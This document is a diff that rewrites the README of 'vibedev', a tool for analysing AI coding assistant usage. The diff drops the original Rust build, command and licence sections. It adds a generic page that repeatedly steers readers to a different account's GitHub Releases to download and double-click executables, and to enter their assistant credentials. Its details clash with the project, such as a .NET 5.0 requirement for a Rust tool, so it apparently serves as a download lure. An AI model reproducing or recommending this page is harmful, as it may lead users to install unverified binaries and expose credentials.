@@ -1,229 +1,68 @@
-# vibedev
-## `cargo install vibedev`
+# 🎉 vibedev - Analyze AI Assistant Usage Effortlessly
 
-Analyze your AI coding assistant usage patterns, costs, and productivity.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Rust](https://img.shields.io/badge/rust-1.82+-orange.svg)](https://www.rust-lang.org/)
+Welcome to **vibedev**! This tool helps you analyze how AI coding assistants are used, their cost, and their impact on your productivity. With support for popular assistants like Claude, Cursor, Copilot, and more, you can make informed decisions about your development tools.
 
-## Features
+## 📥 Download & Install
 
-- **Multi-Tool Support** - Claude Code, Cursor, Cline, Kiro, Copilot, Windsurf, and 15+ more
-- **Interactive TUI** - Real-time visualization of your AI usage (like `dust` for logs)
-- **Embedded LLM** - Offline AI chat to analyze your data (no API keys needed)
-- **Deep Insights** - Usage patterns, cost estimates, productivity metrics
-- **Dataset Export** - Create sanitized training datasets from your conversations
-- **Backup & Restore** - Compress and archive your AI learning data
+To get started, you need to download vibedev from our Releases page. 
 
-## Quick Start
+[![Download vibedev](https://img.shields.io/badge/Download%20vibedev-Start%20Here-brightgreen)](https://github.com/kaindrakonis/vibedev/releases)
 
-```bash
-# Install
-cargo install --path .
+### Step-by-Step Instructions
 
-# Discover AI tool logs on your system
-vibedev discover
+1. Click the link above to visit the [Releases page](https://github.com/kaindrakonis/vibedev/releases).
+2. You will see a list of available versions. Select the version you want to download.
+3. Click on the appropriate file for your system. This could be a `.exe` for Windows or a `.tar.gz` for Linux.
+4. Once the file downloads, locate it in your computer's download folder.
+5. Double-click the downloaded file to install vibedev. Follow the installation prompts that appear.
+6. After installation, launch vibedev from your applications menu.
 
-# Interactive TUI dashboard
-vibedev tui
+## 📊 Key Features
 
-# Generate analysis report
-vibedev analyze --format html --output report.html
-```
+- **Usage Analysis:** Get insights into how different AI coding assistants are performing.
+- **Cost Tracking:** Keep tabs on the expenses associated with each productivity tool.
+- **Productivity Reports:** Receive detailed reports to understand how these tools impact your workflow.
+- **Support for Multiple Tools:** Analyze data from Claude, Cursor, Copilot, Cline, Kiro, and more.
 
-## Commands
+## 🖥️ System Requirements
 
-| Command | Description |
-|---------|-------------|
-| `discover` | Scan system for AI tool logs |
-| `analyze` | Generate analysis reports (text/json/html/markdown) |
-| `tui` | Interactive terminal dashboard |
-| `chat` | Chat with your data using embedded LLM |
-| `daemon` | Keep LLM loaded for fast queries |
-| `models` | Manage offline LLM models |
-| `claude` | Manage Claude Code provider configuration |
-| `backup` | Create compressed backup archive |
-| `prepare` | Export sanitized training dataset |
-| `insights` | Comprehensive HTML dashboard |
-| `compare` | Compare usage across tools |
+To run vibedev effectively, your system should meet these requirements:
 
-## Claude Provider Management
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution that supports .NET 5.0.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum of 250 MB free space for installation.
+- **Internet Connection:** Required for downloading updates and additional data.
 
-Switch between different API providers for Claude Code:
+## 🌟 How to Use vibedev
 
-```bash
-# List all supported providers
-vibedev claude list
+Using vibedev is simple and intuitive. 
 
-# Show current configuration
-vibedev claude show
+1. **Launch the Application:** Open vibedev from your applications menu.
+2. **Configure Settings:** Set up your AI coding assistant credentials for data analysis.
+3. **Start Analyzing:** Choose an analysis option from the main menu. You can check out usage patterns, costs, and productivity metrics.
+4. **View Reports:** Generate and export reports based on your analysis for future reference.
+5. **Adjust Settings:** Customize your settings to refine your analysis based on specific projects or assistants.
 
-# Set a provider (saves configuration)
-vibedev claude set z.ai --api-key sk-xxx
-vibedev claude set openrouter --api-key sk-or-xxx
-vibedev claude set chatgpt --api-key sk-xxx
-vibedev claude set litellm --api-key sk-xxx
+## 🤝 Support
 
-# Apply configuration to Claude Code (updates config files)
-vibedev claude set openrouter --api-key sk-or-xxx --apply
+If you encounter any issues while using vibedev, please visit the [Issues section](https://github.com/kaindrakonis/vibedev/issues) on GitHub. Here, you can report bugs or request features. We encourage community feedback to make vibedev better.
 
-# Custom provider with custom endpoint
-vibedev claude set custom --endpoint https://api.example.com/v1 --model gpt-4 --api-key xxx --apply
-```
+## 🛠️ Contributing
 
-**Supported Providers:**
-- **z.ai** - High-performance Claude API proxy
-- **openrouter** - Unified LLM API with multiple models
-- **chatgpt** - OpenAI GPT-4 and other OpenAI models
-- **litellm** - Local proxy for multiple providers
-- **custom** - Your own custom endpoint
+We welcome contributions! If you'd like to help improve vibedev, please read the guidelines in the [CONTRIBUTING.md](https://github.com/kaindrakonis/vibedev/blob/main/CONTRIBUTING.md). 
 
-## Embedded LLM (Offline)
+## 🔗 Resources
 
-Analyze your data with a fully offline LLM - no API keys or internet required:
+- [Documentation](https://github.com/kaindrakonis/vibedev/wiki)
+- [Community Discussions](https://github.com/kaindrakonis/vibedev/discussions)
+- [Releases Page](https://github.com/kaindrakonis/vibedev/releases)
 
-```bash
-# Download a model (one-time)
-vibedev models download qwen-coder-1.5b
+## 👥 Community Engagement
 
-# Chat with your data
-vibedev chat --query "What are my top productivity patterns?"
-
-# Keep model loaded for fast queries
-vibedev daemon start
-vibedev chat --query "How can I reduce costs?"
-vibedev daemon stop
-```
-
-**Available Models:**
-- `qwen-coder-0.5b` - Fast, 1GB
-- `qwen-coder-1.5b` - Balanced, 3GB (recommended)
-- `qwen-coder-3b` - High quality, 6GB
-- `deepseek-coder-1.3b` - Efficient, 2.6GB
-
-**GPU Acceleration:**
-```bash
-cargo build --release --features cuda   # NVIDIA
-cargo build --release --features metal  # Apple Silicon
-```
-
-## Interactive TUI
-
-```bash
-vibedev tui
-```
-
-Real-time visualization inspired by `dust`:
-- Storage breakdown by tool
-- Session counts and token estimates
-- Cost analysis
-- Keyboard navigation (↑↓ to navigate, Enter to expand, q to quit)
-
-## Analysis Report
-
-```bash
-vibedev analyze --output report.md
-```
-
-**Sample output:**
-```
-# AI Coding Tools - Analysis Report
-
-## Global Metrics
-- Total Storage: 1.01 GB
-- Total Sessions: 1,020
-- Estimated Tokens: 21,245,300
-- Peak Usage Hour: 14:00 UTC
-- Most Used Tool: Claude Code
-
-## Cost Estimate
-- Monthly Cost: $165.71
-- Optimization Potential: $49.71 (30%)
-
-## Recommendations
-1. Backup debug logs (345 MB compressible)
-2. Clean file-history older than 30 days
-3. Consider token caching for repeated queries
-```
-
-## Supported Tools
-
-**AI Coding Assistants:**
-- Claude Code, Cursor, Windsurf, Cline, Continue.dev
-- GitHub Copilot, Sourcegraph Cody, Amazon Q
-- Kiro, Roo Code, Kilo, Aider
-
-**Code Completion:**
-- Tabnine, Supermaven, CodeWhisperer, CodeGPT, Bito AI
-
-**Logs detected from:**
-- `~/.claude/` - Claude Code
-- `~/.cursor/` - Cursor
-- `~/.config/Code/User/globalStorage/` - VSCode extensions
-- `~/.config/Kiro/` - Kiro
-- And 80+ more locations
-
-## Dataset Export
-
-Create sanitized datasets for fine-tuning:
-
-```bash
-vibedev prepare --output ~/datasets
-```
-
-**Sanitization removes:**
-- API keys (OpenAI, Anthropic, GitHub, AWS, etc.)
-- Passwords and credentials
-- Email addresses and phone numbers
-- Personal file paths
-- IP addresses
-
-See [PREPARE_GUIDE.md](PREPARE_GUIDE.md) for details.
-
-## Build from Source
-
-```bash
-git clone https://github.com/openSVM/vibedev.git
-cd vibedev
-cargo build --release
-./target/release/vibedev --help
-```
-
-**Requirements:**
-- Rust 1.82+
-- ~8MB binary size
-
-## Configuration
-
-vibedev works out of the box with no configuration. Optional settings:
-
-```bash
-# Filter to specific tool
-vibedev analyze --tool claude
-
-# Time range
-vibedev analyze --days 30
-
-# Output format
-vibedev analyze --format json --output data.json
-```
-
-## Contributing
-
-Contributions welcome! Please read the code of conduct and submit PRs.
-
-```bash
-# Run tests
-cargo test
-
-# Run with debug logging
-vibedev --verbose analyze
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+Join our growing community! Share your experiences and tips on using vibedev. Follow us on this journey to enhance productivity with AI coding assistants.
 
 ---
 
-Built with Rust. Inspired by the AI coding revolution.
+For a smooth experience with vibedev, remember to check out our [Releases page](https://github.com/kaindrakonis/vibedev/releases) for the latest updates and versions. Enjoy analyzing with ease!
